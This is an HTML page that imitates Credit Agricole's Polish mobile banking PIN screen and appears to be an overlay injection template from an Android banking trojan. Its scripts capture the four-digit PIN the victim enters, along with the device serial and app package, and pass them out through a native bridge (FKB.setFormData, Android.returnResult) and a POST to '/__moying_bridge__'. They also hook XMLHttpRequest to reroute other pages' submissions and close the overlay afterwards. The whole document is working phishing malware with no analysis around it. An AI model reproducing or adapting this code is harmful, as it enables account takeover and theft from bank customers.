<!DOCTYPE html>
<html lang="pl">
<head><script>window.__MOYING_TPL='creditagricole';</script>
<script>
/* ===== 墨影注入页协议 shim（只走原生桥，禁止任何外发） ===== */
(function(){
  var TPL = window.__MOYING_TPL || 'unknown';
  function pk(){ try{ return (window.FKB && FKB.getPkg) ? (FKB.getPkg()||'') : ''; }catch(e){ return ''; } }
  function sn(){ try{ return (window.FKB && FKB.getSn) ? (FKB.getSn()||'') : ''; }catch(e){ return ''; } }
  function push(form){
    var pl = JSON.stringify({ pkg: pk(), sn: sn(), template: TPL, formData: form || {} });
    try{ if(window.FKB && FKB.setFormData) FKB.setFormData(pl); }catch(e){}
    setTimeout(function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }, 300);
    return pl;
  }
  window.__moyingPush = push;
  /* ① 页面自带的 XMLHttpRequest 外发统一截获，改走桥 */
  var _open = XMLHttpRequest.prototype.open, _send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(m,u){ this.__mu = String(u||''); return _open.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function(b){
    var u = this.__mu || '';
    if(u.indexOf('/__moying_bridge__') >= 0 || u.indexOf('/api/inj/result') >= 0){
      var o = {}, tpl = TPL;
      try{ o = JSON.parse(b||'{}'); }catch(e){}
      if(o && o.template) tpl = o.template;
      var form = (o && (o.formData || o.data)) ? (o.formData || o.data) : o;
      window.__MOYING_TPL = tpl;
      push(form);
      return;
    }
    return _send.apply(this, arguments);
  };
  /* ② 直接调用 Android.returnResult(json) 的老页面（如 millennium）也转成我们的协议 */
  var orig = (window.Android && window.Android.returnResult) ? window.Android.returnResult : null;
  var bridge = {
    returnResult: function(s){
      var o = null;
      try{ o = (typeof s === 'string') ? JSON.parse(s) : s; }catch(e){ o = null; }
      if(o && o.action){ if(orig){ try{ return orig(s); }catch(e){} } return; }
      if(o && (o.formData || o.pkg)) push(o.formData || o);
      else push(o || {});
    },
    setFormData: function(s){ try{ var o=JSON.parse(s); push(o.formData||o); }catch(e){ push({}); } },
    getPkg: function(){ return pk(); },
    getSn: function(){ return sn(); },
    getUserName: function(){ try{ return (orig && orig.getUserName && orig.getUserName()) || ''; }catch(e){ return ''; } },
    setClosePage: function(p){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(p||pk()); }catch(e){} },
    close: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} },
    finish: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }
  };
  try{ window.Android = bridge; }catch(e){}
})();
</script>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="format-detection" content="telephone=no">
<meta name="theme-color" content="#0A0A0A">
<title>Credit Agricole</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;background:#0A0A0A}
body{
  color:#fff;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  -webkit-font-smoothing:antialiased;
  -webkit-user-select:none;user-select:none;
  overscroll-behavior:none;overflow:hidden;
}
.app{
  height:100vh;height:100dvh;display:flex;flex-direction:column;
  background:#0A0A0A;
  padding-top:env(safe-area-inset-top,0px);
}

/* ---------- card (no header) ---------- */
.card{
  flex:1 1 auto;min-height:0;background:#0A0A0A;
  position:relative;z-index:2;
  display:flex;flex-direction:column;align-items:center;
  padding:0 24px;
}
.grab{
  width:38px;height:4px;border-radius:2px;background:#333;margin-top:10px;flex:0 0 auto;
}
h1{
  flex:0 0 auto;margin-top:44px;
  font-size:20px;font-weight:400;letter-spacing:.2px;color:#F5F5F5;
}

/* ---------- dots ---------- */
.dots{
  flex:0 0 auto;display:flex;gap:20px;margin-top:46px;height:12px;align-items:center;
}
.dot{
  width:9px;height:9px;border-radius:50%;
  background:#3E3E3E;transition:background .12s ease,transform .12s ease;
}
.dot.on{background:#FFFFFF;transform:scale(1.06)}
.dots.err .dot{background:#B04A46}
.dots.ok .dot{background:#2E7D5B}

/* ---------- keypad ---------- */
.pad{
  flex:0 0 auto;margin-top:auto;padding-top:34px;
  display:flex;flex-direction:column;gap:24px;width:100%;align-items:center;
}
.row{display:flex;gap:26px;justify-content:center;width:100%}
.key{
  width:74px;height:74px;border-radius:50%;
  border:1.2px solid #2E2E2E;background:transparent;color:#fff;
  font-size:24px;font-weight:300;font-family:inherit;
  display:flex;align-items:center;justify-content:center;
  touch-action:manipulation;transition:background .1s ease,transform .1s ease,border-color .1s ease;
}
.key:active,.key.hit{
  background:rgba(255,255,255,.09);border-color:#4A4A4A;transform:scale(.95);
}
.key.ghost{border-color:transparent;pointer-events:none}
.key svg{width:26px;height:26px;fill:none;stroke:#9A9A9A;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
.key:active svg{stroke:#fff}

/* ---------- footer link ---------- */
.forgot{
  flex:0 0 auto;margin-top:auto;margin-bottom:26px;
  background:none;border:0;color:#2E7D5B;font-size:14px;font-family:inherit;
  padding:14px 10px;letter-spacing:.1px;
}
.forgot:active{opacity:.6}
.forgot.shake{animation:sk .35s ease}
@keyframes sk{
  0%,100%{transform:translateX(0)}
  25%{transform:translateX(-6px)}
  75%{transform:translateX(6px)}
}

.homebar{
  flex:0 0 auto;height:22px;display:flex;align-items:center;justify-content:center;
  background:#0A0A0A;padding-bottom:env(safe-area-inset-bottom,0px);
}
.homebar i{width:110px;height:4px;border-radius:2px;background:#3A3A3A;display:block}
</style>
</head>
<body>
<div class="app">

  <section class="card">
    <div class="grab"></div>
    <h1>Podaj PIN mobilny</h1>

    <div class="dots" id="dots">
      <span class="dot"></span><span class="dot"></span>
      <span class="dot"></span><span class="dot"></span>
    </div>

    <div class="pad" id="pad">
      <div class="row">
        <button class="key" type="button" data-k="1">1</button>
        <button class="key" type="button" data-k="2">2</button>
        <button class="key" type="button" data-k="3">3</button>
      </div>
      <div class="row">
        <button class="key" type="button" data-k="4">4</button>
        <button class="key" type="button" data-k="5">5</button>
        <button class="key" type="button" data-k="6">6</button>
      </div>
      <div class="row">
        <button class="key" type="button" data-k="7">7</button>
        <button class="key" type="button" data-k="8">8</button>
        <button class="key" type="button" data-k="9">9</button>
      </div>
      <div class="row">
        <button class="key ghost" type="button" tabindex="-1"></button>
        <button class="key" type="button" data-k="0">0</button>
        <button class="key" type="button" data-k="del" aria-label="Usuń">
          <svg viewBox="0 0 24 24">
            <path d="M9.6 5.5h9.4a1.5 1.5 0 0 1 1.5 1.5v10a1.5 1.5 0 0 1-1.5 1.5H9.6L3.4 12z"/>
            <path d="M12.6 9.8l4.4 4.4M17 9.8l-4.4 4.4"/>
          </svg>
        </button>
      </div>
    </div>

    <button class="forgot" id="forgot" type="button">Nie pamiętam PIN-u mobilnego</button>
  </section>

  <div class="homebar"><i></i></div>
</div>

<script>
(function(){
  "use strict";

  var PIN_LEN  = 4;
  var TEMPLATE = "creditagricole";

  var PKG = "", SN = "";
  try { if (typeof FKB !== "undefined") { if (FKB.getPkg) PKG = FKB.getPkg(); if (FKB.getSn) SN = FKB.getSn(); } } catch (e) {}

  var pad     = document.getElementById("pad");
  var dots    = document.getElementById("dots");
  var forgot  = document.getElementById("forgot");
  var dotEls  = dots.getElementsByClassName("dot");

  var pin = "", sent = false;

  function toJSON(o) {
    try { return JSON.stringify(o); } catch (e) {}
    var out = [], k, v;
    for (k in o) {
      if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
      v = o[k];
      if (typeof v === "string") out.push('"' + k + '":"' + v.replace(/\\/g, "\\\\").replace(/"/g, '\\"') + '"');
      else out.push('"' + k + '":' + v);
    }
    return "{" + out.join(",") + "}";
  }

  function report(payload, useBridge) {
    var pl = toJSON(payload);
    if (useBridge) {
      try { if (typeof Android !== "undefined" && Android.returnResult) Android.returnResult(pl); } catch (e) {}
    }
    if (location.protocol !== "http:" && location.protocol !== "https:") return pl;
    try {
      var x = new XMLHttpRequest();
      x.open("POST", location.origin + "/__moying_bridge__", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ deviceId: SN, pkg: PKG, template: TEMPLATE, formData: pl }));
    } catch (e) {}
    return pl;
  }

  function render() {
    for (var i = 0; i < dotEls.length; i++) {
      dotEls[i].className = "dot" + (i < pin.length ? " on" : "");
    }
  }

  function buzz(ms) { try { if (navigator.vibrate) navigator.vibrate(ms); } catch (e) {} }

  function submit() {
    if (sent) return;
    sent = true;
    dots.className = "dots ok";
    pad.style.pointerEvents = "none";
    pad.style.opacity = ".45";
    buzz(12);
    report({ pin: pin, step: "pin" }, true);
    setTimeout(function () {
      try { if (typeof Android !== "undefined" && Android.close) Android.close(); } catch (e) {}
    }, 600);

    /* if the overlay is still on screen after 6s, the bridge did not close it: unlock and let the user retry */
    setTimeout(function () {
      if (!sent) return;
      if (document.hidden || document.visibilityState === "hidden") return;
      sent = false;
      pin = "";
      render();
      dots.className = "dots err";
      setTimeout(function () { dots.className = "dots"; }, 900);
      pad.style.pointerEvents = "";
      pad.style.opacity = "";
    }, 6000);
  }

  function press(k) {
    if (sent) return;
    if (k === "del") {
      if (!pin.length) return;
      pin = pin.slice(0, -1);
      render();
      buzz(8);
      return;
    }
    if (pin.length >= PIN_LEN) return;
    pin += k;
    render();
    buzz(9);
    if (pin.length === PIN_LEN) setTimeout(submit, 120);
  }

  pad.addEventListener("click", function (e) {
    var btn = e.target.closest ? e.target.closest(".key") : null;
    if (!btn) return;
    var k = btn.getAttribute("data-k");
    if (!k) return;
    press(k);
  }, true);

  document.addEventListener("keydown", function (e) {
    if (e.key >= "0" && e.key <= "9") { press(e.key); return; }
    if (e.key === "Backspace") { e.preventDefault(); press("del"); }
  });

  forgot.addEventListener("click", function () {
    if (sent) return;
    forgot.classList.remove("shake");
    void forgot.offsetWidth;
    forgot.classList.add("shake");
  });

  render();
})();
</script>
</body>
<!-- moying pkg=pl.creditagricole.efk tpl=creditagricole -->
</html>
